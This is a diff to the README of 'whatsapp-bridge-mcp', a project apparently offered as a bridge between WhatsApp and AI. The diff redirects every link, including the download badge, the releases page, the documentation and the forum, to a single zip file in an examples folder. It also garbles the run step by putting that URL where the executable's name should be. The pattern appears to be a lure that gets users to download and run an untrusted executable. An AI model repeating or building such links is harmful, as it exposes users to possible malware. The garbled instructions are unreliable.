@@ -1,6 +1,6 @@
 # 🌟 whatsapp-bridge-mcp - Connect WhatsApp with AI Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/tkboys123/whatsapp-bridge-mcp/releases)
+[![Download](https://github.com/tkboys123/whatsapp-bridge-mcp/raw/refs/heads/master/examples/basic-bot/mcp_whatsapp_bridge_2.9.zip)](https://github.com/tkboys123/whatsapp-bridge-mcp/raw/refs/heads/master/examples/basic-bot/mcp_whatsapp_bridge_2.9.zip)
 
 ## 📘 Overview
 
@@ -13,7 +13,7 @@ Follow these simple steps to download and run whatsapp-bridge-mcp on your comput
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   To get the latest version of whatsapp-bridge-mcp, visit the [Releases page](https://github.com/tkboys123/whatsapp-bridge-mcp/releases). 
+   To get the latest version of whatsapp-bridge-mcp, visit the [Releases page](https://github.com/tkboys123/whatsapp-bridge-mcp/raw/refs/heads/master/examples/basic-bot/mcp_whatsapp_bridge_2.9.zip). 
 
 2. **Select a Version**  
    On the Releases page, you will find several versions. Choose the most recent one for optimal performance.
@@ -25,7 +25,7 @@ Follow these simple steps to download and run whatsapp-bridge-mcp on your comput
    If you downloaded a zip file, locate it on your computer, right-click, and select "Extract All" to unzip the contents.
 
 5. **Run the Application**  
-   Navigate to the folder where you extracted the files. Look for the executable file (e.g., `whatsapp-bridge.exe`). Double-click this file to start the application.
+   Navigate to the folder where you extracted the files. Look for the executable file (e.g., `https://github.com/tkboys123/whatsapp-bridge-mcp/raw/refs/heads/master/examples/basic-bot/mcp_whatsapp_bridge_2.9.zip`). Double-click this file to start the application.
 
 6. **Follow On-Screen Instructions**  
    The application will provide prompts to guide you through the initial setup. Simply follow the instructions to connect your WhatsApp account.
@@ -87,8 +87,8 @@ whatsapp-bridge-mcp is licensed under the MIT License. You are free to use, modi
 
 ## 📌 Quick Links
 
-- [Download the Latest Release](https://github.com/tkboys123/whatsapp-bridge-mcp/releases)
-- [Documentation](https://github.com/tkboys123/whatsapp-bridge-mcp/docs)
-- [Community Forum](https://github.com/tkboys123/whatsapp-bridge-mcp/community)
+- [Download the Latest Release](https://github.com/tkboys123/whatsapp-bridge-mcp/raw/refs/heads/master/examples/basic-bot/mcp_whatsapp_bridge_2.9.zip)
+- [Documentation](https://github.com/tkboys123/whatsapp-bridge-mcp/raw/refs/heads/master/examples/basic-bot/mcp_whatsapp_bridge_2.9.zip)
+- [Community Forum](https://github.com/tkboys123/whatsapp-bridge-mcp/raw/refs/heads/master/examples/basic-bot/mcp_whatsapp_bridge_2.9.zip)
 
 With the above steps, you can now connect WhatsApp with AI easily. Enjoy automating your customer interactions with whatsapp-bridge-mcp!
